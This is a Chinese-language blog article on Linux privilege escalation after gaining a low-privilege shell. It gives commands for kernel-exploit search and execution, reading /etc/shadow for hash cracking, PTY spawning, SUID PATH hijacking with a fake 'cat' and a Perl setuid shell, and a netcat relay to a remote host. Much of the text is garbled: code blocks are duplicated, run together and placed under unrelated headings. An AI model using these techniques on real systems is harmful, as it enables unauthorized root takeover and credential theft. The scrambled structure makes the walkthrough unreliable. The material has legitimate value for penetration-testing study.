> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Y1ncJyqqRfDAs-bnrWV1ww)

`![](https://mmbiz.qpic.cn/mmbiz_gif/GfOvuXUmaIichKN4fuyBV856xHdsnuRTeChfYItiaiaP6C5QQibXh56dmwWiaMFia2yE01nib45cPuiaib6kMd5OT95aeeA/640?wx_fmt=gif)  
`

`我们能拿下服务器的web服务，却被管理员把内网渗透的提权扼杀在萌芽里面。Linux系统的提权过程不止涉及到了漏洞，也涉及了很多系统配置。以下是总结的一些提权方法。`

`**前提**`
--------

```
已经拿到低权shell被入侵的机器上面有nc，python，perl等linux非常常见的工具有权限上传文件和下载文件
已经拿到低权shell
被入侵的机器上面有nc，python，perl等linux非常常见的工具
有权限上传文件和下载文件
```

`**内核漏洞提权**`
------------

`内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集。`

`查看发行版`

```
cat /etc/issuecat /etc/*-release
cat /etc/issue
cat /etc/*-release
```

`查看内核版本`

```
uname -a
uname -a
```

`这里我找了台机器测试：`

```
#uname -aLinux xxxxx 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux#cat /etc/*-releaseDISTRIB_ID=UbuntuDISTRIB_RELEASE=10.04DISTRIB_CODE
#uname -a
Linux xxxxx 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux#cat /etc/*-release
DISTRIB_ID=UbuntuDISTRIB_RELEASE=10.04
DISTRIB_CODENAME=lucid
DISTRIB_DESCRIPTION="Ubuntu 10.04 LTS"
```

```
searchspoit linux 2.6 ubuntu priv esc
searchspoit linux 2.6 ubuntu priv esc
```

`可以开始搜索了，大多内核漏洞通过内核版本能很快查到，用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码`

```
searchsploit linux priv esc 2.6 ubuntu 10
searchsploit linux priv esc 2.6 ubuntu 10
```

```
#gcc exp.c#lsexp.ca.out#./a.outiduid=0(root) gid=0(root)
#gcc exp.c
#lsexp.c
a.out#./a.out
id
uid=0(root) gid=0(root)
```

`![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7erNwBMUDm8luu5tpSEZNa4iapX929EWBvBpZLtrgyKooGbIfdKyK4ic2wNzUnibQEbMibnNZia4w75vyA/640?wx_fmt=png)`

`这么多，我们加入系统信息缩小范围  
`

```
cat /etc/fstab
cat /etc/fstab
```

`![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7erNwBMUDm8luu5tpSEZNa4W3n4mm97EceesjGG5FY9KF6fVSSyu5icVA9BjLhZ1kXJFsTwcyQ0DYw/640?wx_fmt=png)`

`这样可选的exp就少多了，很无奈，我们需要漫长的**点开exp看具体要求**的筛选过程，大部分exp都会写清生效条件。因此我们能够虽然很气，但也很快地去掉一些不具备利用条件的exp。比如第三个exp针对一个特别的磁盘格式，排除。经过艰难的寻找，发现15704,c很顺眼，于是把源代码上传，然后：`

```
dpkg -lrpm -qa
dpkg -l
rpm -qa
```

```
1.读源码，不然可能连编译都不会2.读源码，不然费劲编译完才发现不适用3.读源码，不然遇到一个删全盘的”exp“怎么办
1.读源码，不然可能连编译都不会
2.读源码，不然费劲编译完才发现不适用
3.读源码，不然遇到一个删全盘的”exp“怎么办
```

`exploitdb的搜索过程虽然繁琐，但是能基本保证不会遗漏漏洞。如果想先偷懒图个快的话，我们可以试试https://www.kernel-exploits.com/，这里的exp已经按照内核版本分类了，而且有很多已经完成了编译。`

`比如我们搜索2.6.32：`

`![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7erNwBMUDm8luu5tpSEZNa4t3LXUHFVDtCuDNCV3ms0nxupecMOUpUJIZV2eZt0QcwqIT8rnL9Zkg/640?wx_fmt=png)`

`这个rds的binary刚巧能用。“我收集信息了，我上传exp了，我就root了。“  
`

`当然，以上只是非常理想的情况，我们经常会遇到没有gcc的坑爹服务器。这时我们就需要在本地编译。本地编译时不止要**看exp源码注释的编译参数**，也需要手动调整一下编译的参数，比如给gcc 加-m 32来编译32位。编译问题繁多，有困难找谷歌，不再赘述。`

`当内核版本没有好用的exp对应的时候，可以检查磁盘格式:`

```
root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsesshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
ibuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
```

```
passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了（这样非root就看不到了）。而shadow里面最重要的就是密码的hashroot:$6$URgq7sJf$4x8e9ntqTwAPIubi9YLxLQ2mZTTZKnGz0g/wWzOdPB5eGuz.S5iRtFdvfFd9VIVEWouiodB/hh9BYOLgAD8u5/:16902:0:99999:7:::daemon:*:15730:0:99999:7:::bin:*:15730:0:99999:7:::sys:*:15730:0:99999:7:::sync:*:15730:0:99999:7:::games:*:15730:0:99999:7:::man:*:15730:0:99999:7:::lp:*:15730:0:99999:7:::mail:*:15730:0:99999:7:::news:*:15730:0:99999:7:::uucp:*:15730:0:99999:7:::proxy:*:15730:0:99999:7:::www-data:*:15730:0:99999:7:::backup:*:15730:0:99999:7:::list:*:15730:0:99999:7:::irc:*:15730:0:99999:7:::gnats:*:15730:0:99999:7:::nobody:*:15730:0:99999:7:::libuuid:!:15730:0:99999:7:::syslog:*:15730:0:99999:7:::mysql:!:15730:0:99999:7:::dovecot:*:15730:0:99999:7:::sshd:*:15730:0:99999:7:::postfix:*:15730:0:99999:7:::
passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了（这样非root就看不到了）。而shadow里面最重要的就是密码的hashroot:$6$URgq7sJf$4x8e9ntqTwAPIubi9YLxLQ2mZTTZKnGz0g/wWzOdPB5eGuz.S5iRtFdvfFd9VIVEWouiodB/hh9BYOLgAD8u5/:16902:0:99999:7:::
daemon:*:15730:0:99999:7:::
bin:*:15730:0:99999:7:::
sys:*:15730:0:99999:7:::
sync:*:15730:0:99999:7:::
games:*:15730:0:99999:7:::
man:*:15730:0:99999:7:::
lp:*:15730:0:99999:7:::
mail:*:15730:0:99999:7:::
news:*:15730:0:99999:7:::
uucp:*:15730:0:99999:7:::
proxy:*:15730:0:99999:7:::
www-data:*:15730:0:99999:7:::
backup:*:15730:0:99999:7:::
list:*:15730:0:99999:7:::
irc:*:15730:0:99999:7:::
gnats:*:15730:0:99999:7:::
nobody:*:15730:0:99999:7:::
libuuid:!:15730:0:99999:7:::
syslog:*:15730:0:99999:7:::
mysql:!:15730:0:99999:7:::
dovecot:*:15730:0:99999:7:::
sshd:*:15730:0:99999:7:::
postfix:*:15730:0:99999:7:::
```

```
cd /etcls -l passwd shadow
cd /etc
ls -l passwd shadow
```

`然后进行刚刚繁琐的搜索，没准就找到个bug  
`

`最后强调利用内核漏洞的几个注意点：`

```
python -c 'import pty;pty.spawn("/bin/sh")'
 python -c 'import pty;pty.spawn("/bin/sh")'
```

`**明文root密码提权**`
----------------

### `**passwd和shadow**`

`虽然遇到的概率很小，但还是提一下，大多linux系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。`

`这里是一个典型的passwd文件`

```
python -c 'import pty;pty.spawn("/bin/sh")'$ sudo susudo su[sudo] password for www-data: 123456Sorry, try again.[sudo] password for www-data:
python -c 'import pty;pty.spawn("/bin/sh")'
$ sudo su
sudo su
[sudo] password for www-data: 123456
Sorry, try again.
[sudo] password for www-data:
```

```
ls -l /etc/cron*
ls -l /etc/cron*
```

```
#include<stdlib.h>#include <unistd.h> int main(){setuid(0);//run as rootsystem("id");system("cat /etc/shadow");}
#include<stdlib.h>
#include <unistd.h>
 int main()
{
setuid(0);//run as root
system("id");
system("cat /etc/shadow");
}
```

```
gcc suid.c  -o suid-expchmod 4755 ./suid-exp#这里设置了SUID位ls -l
gcc suid.c  -o suid-exp
chmod 4755 ./suid-exp#这里设置了SUID位
ls -l
```

```
-rwsr-xr-x 1 root root 8632 Mar 15 20:53 suid-exp
-rwsr-xr-x 1 root root 8632 Mar 15 20:53 suid-exp
```

### `如果passwd可写，我们就可以把root的密码字段(x)替换成一个已知密码的hash（比如本机shadow里面的root密码hash），这样系统在验证密码时以passwd的为准，密码就已知了。如果shadow可读，我们可以读走root的hash，然后用hashcat或者john暴力破解之。`

### `**密码复用**`

`很多管理员会重复使用密码，因此数据库或者web后台的密码也许就是root密码。`

### `**and then？**`

`有了（疑似）root密码怎么办？你一定想ssh登陆。然而ssh很可能禁止root登陆，或是防火墙规则将你排除在外了。返回来想，我们不是有一个低权shell了吗？找个办法再上面“输入”密码就好了。显然，直接在低权shell里面用sudo是不奏效的。这是因为出于安全考虑，linux要求用户必须从**终端设备**（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。python就有这样的功能。在shell里面输入：`

```
su test./suid-exp
su test
./suid-exp
```

```
cat >> /tmp/cat <<EOF#!/usr/bin/pythonprint "this is not the true cat"print "here is a root shell!"import pty;pty.spawn("/bin/sh")EOF# 这里我们在/tmp建立了假的cat，它会用python执行一个shellPATH=/tmp:$PATH#设置PATH，优先从/tmp查找程序./suid-exp#执行suid程序，因为PATH被劫持，system("cat /etc/shadow");会执行我们的假cat
cat >> /tmp/cat <<EOF
#!/usr/bin/python
print "this is not the true cat"
print "here is a root shell!"
import pty;pty.spawn("/bin/sh")
EOF
# 这里我们在/tmp建立了假的cat，它会用python执行一个shell
PATH=/tmp:$PATH#设置PATH，优先从/tmp查找程序
./suid-exp#执行suid程序，因为PATH被劫持，system("cat /etc/shadow");会执行我们的假cat
```

`就用python简历了一个虚拟终端，然后就可以使用sudo等等命令了。`

```
#!/usr/bin/perl$< = $>;$( = $) = 0;system ("/bin/sh"):
#!/usr/bin/perl
$< = $>;
$( = $) = 0;
system ("/bin/sh"):
```

```
netstat -antup#查看各种网络服务
netstat -antup#查看各种网络服务
```

`系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出`

```
mkfifo backpipenc -l 8082 0<backpipe | nc remote_host 445 1>backpipe
mkfifo backpipe
nc -l 8082 0<backpipe | nc remote_host 445 1>backpipe
```

`![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7erNwBMUDm8luu5tpSEZNa4jOia042CA6nlgiaEboegBW3UnbHE6zG2mo0YH2CxCYfrK6otl1hHby7w/640?wx_fmt=png)`

`默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写的管理员，我们就可以修改脚本等回连rootshell了。  
`

`**SUID**`
----------

`SUID是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行。比如passwd命令，就是以root权限运行来修改shadow的。`

`这里我们做个实验(环境为ubuntu 16.04)：`

`c源代码`

```
unix-privesc-check：http://pentestmonkey.net/tools/audit/unix-privesc-check
unix-privesc-check：http://pentestmonkey.net/tools/audit/unix-privesc-check
```

```
linuxprivchecker：https://www.securitysift.com/download/linuxprivchecker.py
linuxprivchecker：
https://www.securitysift.com/download/linuxprivchecker.py
```

```
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```

```
http://www.xinotes.net/notes/note/1529/https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
http://www.xinotes.net/notes/note/1529/
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```

```
-rwsr-xr-x 1 root root 8632 Mar 15 20:53 suid-exp
-rwsr-xr-x 1 root root 8632 Mar 15 20:53 suid-exp
```

```
注意s属性，表示这个程序有SUID的属性。
```

`接下来我们切换用户并执行`

```
su test
./suid-exp
su test
./suid-exp
```

`![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7erNwBMUDm8luu5tpSEZNa43aRLAlTiav2QaOwYyPdQbbL8ejGjSf8iavarFGI5AhYmGPNaZtRicTolw/640?wx_fmt=png)`

`可以看到程序实际上已经提升到了root权限。`

`SUID程序经常存在提权漏洞，比如nmap就曾出现过提权漏洞。低权用户通过打开nmap交互模式以root执行任意系统命令。而除了借助程序功能提权，我们还可以尝试劫持环境变量提权。上文的c程序使用了system函数，system函数是继承环境变量的，因此我们通过替换环境变量可以达到执行任意命令的效果。`

`我们进入test低权用户的shell`

```
cat >> /tmp/cat <<EOF
#!/usr/bin/python
print "this is not the true cat"
print "here is a root shell!"
import pty;pty.spawn("/bin/sh")
EOF
# 这里我们在/tmp建立了假的cat，它会用python执行一个shell
PATH=/tmp:$PATH#设置PATH，优先从/tmp查找程序
./suid-exp#执行suid程序，因为PATH被劫持，system("cat /etc/shadow");会执行我们的假cat
cat >> /tmp/cat <<EOF
#!/usr/bin/python
print "this is not the true cat"
print "here is a root shell!"
import pty;pty.spawn("/bin/sh")
EOF
# 这里我们在/tmp建立了假的cat，它会用python执行一个shell
PATH=/tmp:$PATH#设置PATH，优先从/tmp查找程序
./suid-exp#执行suid程序，因为PATH被劫持，system("cat /etc/shadow");会执行我们的假cat
```

```
运行结果
```

`![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7erNwBMUDm8luu5tpSEZNa4belNSib0farEiapNJL66m3QhVdNficdeGx5rYutQUIwPLyoicjKCc4stRg/640?wx_fmt=png)`

`还有一种情况：管理员配置错误，把不带setuid(0);代码的程序配置了SUID。当这些程序被劫持的时候，我们需要自己的程序中使用setuid(0);来提权到root。这里有一个小技巧，我们用perl脚本来setuid：  
`

```
#!/usr/bin/perl
$< = $>;
$( = $) = 0;
system ("/bin/sh"):
#!/usr/bin/perl
$< = $>;
$( = $) = 0;
system ("/bin/sh"):
```

```
用这个简单的脚本劫持，就把shell运行在root权限下了。
```

`**网络与隐藏的服务**`
--------------

`有一些服务器的服务会被配置成对内网或者对本机开放。通过对他们的攻击我们有机会接触更多的敏感文件，或是运气足够好碰上一个远程root漏洞。`

```
netstat -antup#查看各种网络服务
netstat -antup#查看各种网络服务
```

`![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7erNwBMUDm8luu5tpSEZNa4Fc1qu5YB2A6lE9yaia0Tap72VONUicwE55BtMLtqSgn4fKoDDqUL8Kibg/640?wx_fmt=png)`

`如果找到些神秘的服务，可以用netcat做个转发  
`

```
mkfifo backpipe
nc -l 8082 0<backpipe | nc remote_host 445 1>backpipe
mkfifo backpipe
nc -l 8082 0<backpipe | nc remote_host 445 1>backpipe
```

```
之后找漏洞，攻击，从头再来。
```

`**相关工具**`
----------

`提了那么配置错误的利用，却没说怎么找这些错误，分享两个脚本：`

```
unix-privesc-check：http://pentestmonkey.net/tools/audit/unix-privesc-check
unix-privesc-check：http://pentestmonkey.net/tools/audit/unix-privesc-check
```

`![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7erNwBMUDm8luu5tpSEZNa4GXvtT59054e9icUQJlZHf3WddLZb29rrdKUSeWIt9RRIt1TYWyFRnYg/640?wx_fmt=png)`

```
linuxprivchecker：
https://www.securitysift.com/download/linuxprivchecker.py
linuxprivchecker：
https://www.securitysift.com/download/linuxprivchecker.py
```

`这两个程序不止细致地检查了非常多的配置问题，更让人感动地列出了所有可写文件。基本上可以说他们的检查是足够全面的。  
`

`当然如果希望手动检查还是推荐`

```
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```

`**总结**`
--------

`Linux提权花样非常多，涉及的技术五花八门。写这篇文章的时候总想把相关知识都解释清楚，但是面对系统繁琐的工作过程和众多的发行版深感自己理解之浅。我很赞同在很多论坛上看到的对于linux提权的提示：你需要知道linux系统的工作方式。各种奇技淫巧或是无比脑残的错误最终都回归到了系统的运行流程和权限管理机制上面。回归本质，系统地了解系统才是保证安全的最佳方式。`

`参考资料`
------

```
http://www.xinotes.net/notes/note/1529/
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
http://www.xinotes.net/notes/note/1529/
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```

为方便技术交流、接收粉丝建议，贴出了运营小哥哥的微信，可扫码加![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icmg3GtpicccsBAlnWhPSfHdNEXIcw7bFc1vf7lxKrnXCsMkicQibJOG1LLdlBrganbFSLj8fsg6FkhWQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icmg3GtpicccsBAlnWhPSfHdNMRFgII88wuibXAdHwuJqjq0oicQ6YI9yC9LLvIYlyoozPrOnjtTxDjnQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icmg3GtpicccsBAlnWhPSfHdNEXIcw7bFc1vf7lxKrnXCsMkicQibJOG1LLdlBrganbFSLj8fsg6FkhWQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icmg3GtpicccsBAlnWhPSfHdNMRFgII88wuibXAdHwuJqjq0oicQ6YI9yC9LLvIYlyoozPrOnjtTxDjnQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icmg3GtpicccsBAlnWhPSfHdNNmB82btBAJ4HxSLK7FayCB2vshpiaWRiaaCcnfpwpspqxqRb5J5Xh9cA/640?wx_fmt=png)

依旧是限时加，晚 5 点后会暂时关闭二维码加好友

欢迎各位大佬加好友![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5iclib1xajMMSzVtcZLDb1ibibY9WkEE5tAKfWgV1MSbG4iaLUzVibmaeUEAksf6N4WltORiaFyyhkCz19hHw/640?wx_fmt=png)

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)

“如侵权请私聊公众号删文”

![](https://mmbiz.qpic.cn/mmbiz_png/ffq88LJJ8oPhzuqa2g06cq4ibd8KROg1zLzfrh8U6DZtO1oWkTC1hOvSicE26GgK8WLTjgngE0ViaIFGXj2bE32NA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/x1FY7hp5L8Hr4hmCxbekk2xgNEJRr8vlbLKbZjjWdV4eMia5VpwsZHOfZmCGgia9oCO9zWYSzfTSIN95oRGMdgAw/640?wx_fmt=gif)

[2020hw 系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247492405&idx=1&sn=c84692daf6077f5cc7c348d1e5b3a349&chksm=f9e38c6ece9405785260b092d04cfb56fec279178d4efcd34bf8121b89a28885bf20568cdfda&scene=21#wechat_redirect)  

[ctf 系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493664&idx=1&sn=40df204276e9d77f5447a0e2502aebe3&chksm=f9e3877bce940e6d0e26688a59672706f324dedf0834fb43c76cffca063f5131f87716987260&scene=21#wechat_redirect)

[日志安全系列 - 安全日志](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494122&idx=1&sn=984043006a1f65484f274eed11d8968e&chksm=f9e386b1ce940fa79b578c32ebf02e69558bcb932d4dc39c81f4cf6399617a95fc1ccf52263c&scene=21#wechat_redirect)

[【干货】流量分析系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494242&idx=1&sn=7f102d4db8cb4dddb5672713803dc000&chksm=f9e38539ce940c2f488637f312fb56fd2d13a3dd57a3a938cd6d6a68ebaf8806b37acd1ce5d0&scene=21#wechat_redirect)

[【干货】超全的 渗透测试系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494408&idx=1&sn=75b61410ecc5103edc0b0b887fd131a4&chksm=f9e38453ce940d450dc10b69c86442c01a4cd0210ba49f14468b3d4bcb9d634777854374457c&scene=21#wechat_redirect)

[【干货】持续性更新 - 内网渗透测试系列文章](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494623&idx=1&sn=f52145509aa1a6d941c5d9c42d88328c&chksm=f9e38484ce940d920d8a6b24d543da7dd405d75291b574bf34ca43091827262804bbef564603&scene=21#wechat_redirect)  

[【干货】android 安全系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494707&idx=1&sn=5b2596d41bda019fcb15bbfcce517621&chksm=f9e38368ce940a7e95946b0221d40d3c62eeae515437c040afd144ed9d499dcf9cc67f2874fe&scene=21#wechat_redirect)

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnAsbXzXAVx0TwTHEy4yhBTShsTzrKfPqByzM33IVib0gdPRn3rJw3oz2uXBa4h2msAcJV6mztxvjQ/640?wx_fmt=png)